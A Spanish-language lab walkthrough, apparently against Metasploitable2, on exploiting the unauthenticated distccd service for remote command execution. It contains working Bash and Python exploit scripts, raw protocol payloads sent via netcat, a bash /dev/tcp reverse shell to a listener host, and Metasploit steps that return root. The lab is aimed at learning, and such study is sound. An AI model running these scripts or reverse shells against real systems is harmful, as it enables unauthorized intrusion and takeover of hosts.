# 🧠 Objetivo del laboratorio (DistCC)

Aprender a identificar, verificar y explotar (si es posible) un servicio DistCC expuesto y mal configurado. Este servicio, si no cuenta con autenticación o restricciones, puede permitir ejecutar comandos arbitrarios en el servidor, lo que constituye una Remote Command Execution (RCE).

# 🧩 ¿Qué es DistCC?

DistCC es una herramienta diseñada para distribuir compilaciones de código C/C++ a través de múltiples máquinas, acelerando el proceso de compilación.
Sin embargo, si no está configurado adecuadamente (sin autenticación y expuesto en la red), permite a cualquier atacante remoto ejecutar comandos arbitrarios, lo cual es crítico.

# 🎯 Qué haremos

1. Escanearemos la máquina para detectar el servicio DistCC.
2. Verificaremos manualmente si está vulnerable.
3. Intentar ejecutar comandos simples.
4. Probar una reverse shell para acceso remoto.
5. Analizar resultados y posibles causas de fallo.

## 🔍 Paso 1: Escaneo con Nmap

```bash
nmap -sV -p 3632 192.168.26.102
```

Obtenemos como resultado:

| Puerto   | Estado | Servicio | Versión                          |
|----------|--------|----------|----------------------------------|
| 3632/tcp | open   | distccd  | distccd v1 (GNU distcc 2.18.3)   |

✅ Confirmamos que el servicio DistCC está activo.

## 🧪 Paso 2: Verificación manual de la vulnerabilidad

DistCC puede ejecutarse desde la terminal usando **nc** o **telnet**. El siguiente payload prueba si podemos ejecutar un comando arbitrario.

```bash
(
echo "DIST00000001"
echo "ARGC00000001"
echo "ARGV00000002sh"
echo "ARGV00000002-c"
echo "ARGV00000011id;exit"
echo "DOTI00000000"
echo "DONE00000000"
) | nc 192.168.56.102 3632
```

Resultado:
La conexión se establece, pero no devuelve ninguna salida del comando id.

## ⚙️ Paso 3: Automatización en Bash y Python

Script en Bash (distcc_exploit.sh)

```bash
#!/bin/bash
# Uso: ./distcc_exploit.sh "comando"
RHOST="192.168.56.102"
CMD="$1"
LEN=$(printf "%08d" ${#CMD})

echo "[+] Ejecutando '$CMD' en $RHOST:3632"

(
echo "DIST00000001"           # Cabecera de protocolo DistCC
echo "ARGC00000001"           # Número de argumentos
echo "ARGV00000002sh"         # Primer argumento: sh (shell)
echo "ARGV00000002-c"         # Segundo argumento: -c (ejecutar comando)
echo "ARGV${LEN}${CMD}"       # Comando a ejecutar con su longitud
echo "DOTI00000000"           # Marca de inicio de datos (vacío)
echo "DONE00000000"           # Fin de datos
) | nc $RHOST 3632
```

Script en Python (distcc_exploit.py)

```python
#!/usr/bin/env python3
import socket
import sys

if len(sys.argv) != 3:
    print(f"Uso: {sys.argv[0]} <RHOST> <COMANDO>")
    sys.exit(1)

rhost, cmd = sys.argv[1], sys.argv[2]
port = 3632

# Construir payload según protocolo DistCC
payload = (
    f"DIST00000001\n"
    f"ARGC00000001\n"
    f"ARGV00000002sh\n"
    f"ARGV00000002-c\n"
    f"ARGV{len(cmd):08d}{cmd}\n"
    f"DOTI00000000\n"
    f"DONE00000000\n"
).encode()

print(f"[+] Conectando a {rhost}:{port}...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rhost, port))
s.send(payload)
response = s.recv(4096)
print("[+] Respuesta del servidor:\n")
print(response.decode(errors="ignore"))
s.close()
```

Resultado en ambos casos:
No se recibe salida del comando ejecutado, lo que indica que la vulnerabilidad no se está explotando con éxito.

## 🔄 Paso 4: Prueba de reverse shell

Intento de reverse shell en Bash:

```bash
RHOST="192.168.56.102"
LHOST="192.168.56.101"
LPORT=4444
CMD="bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1"
LEN=$(printf "%08d" ${#CMD})

(
echo "DIST00000001"
echo "ARGC00000001"
echo "ARGV00000002sh"
echo "ARGV00000002-c"
echo "ARGV${LEN}${CMD}"
echo "DOTI00000000"
echo "DONE00000000"
) | nc $RHOST 3632
```

Abrimos una nueva terminal y nos ponemos en escucha en el puerto:

```bash
nc -lvnp 4444
```

Resultado:
No se recibe conexión de vuelta.


# 📌 Análisis de lo ocurrido

El servicio DistCC acepta la conexión pero no ejecuta comandos.
Esto puede deberse a varias razones:

1. **Restricciones de ejecución**: El servidor puede estar configurado para solo permitir compilaciones desde ciertas IPs (--allow) y descartar el resto.
2. **Parche de seguridad aplicado**: La versión del binario puede haber sido modificada para no ejecutar comandos arbitrarios.
3. **Salida estándar bloqueada**: Aunque se ejecuten comandos, la salida no se redirige al cliente (esto haría que ataques de tipo reverse shell sean necesarios para comprobar ejecución).

# 🛠 Posibles soluciones / pasos siguientes

- Probar comandos con efecto visible sin depender de la salida:

  ```bash
  CMD="touch /tmp/prueba_distcc"
  ```

  y luego comprobar si el archivo se ha creado usando otro vector (web shell, SSH, etc).

  - Usar payloads alternativos (Netcat, Perl, Python) para la revese shell.
  - Enumerar reglas de firewall y configuración de distccd si se obtiene otro acceso al host.
 
# Solución alternativa automática (Metasploit).

## 🚀 Paso 1: Iniciar Metasploit

```bash
msfconsole
```

## 🔎 Paso 2: Buscar el módulo de explotación

```bash
search distccd
```

Resultado:

exploit/unix/misc/distcc_exec

Este módulo permite ejecutar comandos arbitrarios en el servicio distccd.

## 🧨 Paso 3: Cargar el módulo

```bash
use exploit/unix/misc/distcc_exec
```

## ⚙️ Paso 4: Configuración de los parámetros

```bash
set RHOSTS 192.168.56.102
set RPORT 3632
set CMD whoami
```

🔎 El parámetro CMD puede contener cualquier comando Unix, como id, uname -a, etc.

## 🎯 Paso 5: Ejecutar el exploit

```bash
run
```

Salida:

[*] Command output:
root

# 🧪 Alternativa: Obtener una reverse shell

Para una sesión interactiva, se puede configurar un payload:

```bash
set payload cmd/unix/reverse
set LHOST <IP_local_atacante>
set LPORT 4444
```

Ejecutamos el exploit:

```bash
run
```

Y, en otro terminal, iniciar el listener:

```bash
nc -lvnp 4444
```

# ✅ Resultado

Se logra la ejecución remota de comandos en la máquina víctima a través del servicio distccd, demostrando una explotación exitosa mediante Metasploit. Esta vía alternativa es más robusta y automatizada que el intento manual con netcat.

# 📁 Referencias

- [Metasploit Framework](https://www.metasploit.com/)
- [Metasploitable2 Vulnerable Services](https://docs.rapid7.com/metasploit/metasploitable-2/)


# 📚 Conclusión

- Puerto 3632 (DistCC) detectado y accesible.
- El servicio no respondió a intentos de ejecución de comandos ni a payloads de reverse shell.
- Lo más probable es que esté restringido o parcheado.
- Utilizamos el framework metasploit para lograr la explotación del servicio.
